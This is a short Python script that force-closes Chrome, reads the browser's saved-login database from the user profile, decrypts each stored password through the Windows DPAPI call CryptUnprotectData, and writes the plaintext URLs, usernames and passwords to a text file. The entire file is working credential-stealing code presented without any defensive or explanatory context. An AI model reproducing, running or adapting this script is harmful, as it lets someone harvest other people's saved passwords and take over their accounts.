import os
import sqlite3
import win32crypt
def get_chrome():
    #close the chrome browser
    os.system("taskkill /im chrome.exe /f")
    #Locate "Login Data" file where all passwords are saved
    data_path = os.path.expanduser('~')+r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    #Select URL, UserName, Pwds from logins table
    select_stmt = "SELECT origin_url,username_value,password_value FROM logins"
    cursor.execute(select_stmt)
    login_data = cursor.fetchall()
    cursor.close()
    cred = {}
    pwds={}
    #Decode saved passwords
    for url,user_name,pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name,pwd[1].decode('utf8'))
    #Save it to text file "pwds.txt"
    with open('passwords.txt','a') as f:
        for i,j in cred.items():
            if j[1] != '' and j[0] != '':
                i1= i.split('/')
                pwds[i1[2]] = (j[0],j[1])
        #sort according to URL in assending 
        for j in sorted(pwds):
            f.write("{0:<35}{1:<35}{2:<15}\n".format(j,pwds[j][0],pwds[j][1]))
if __name__ == "__main__":
    get_chrome()
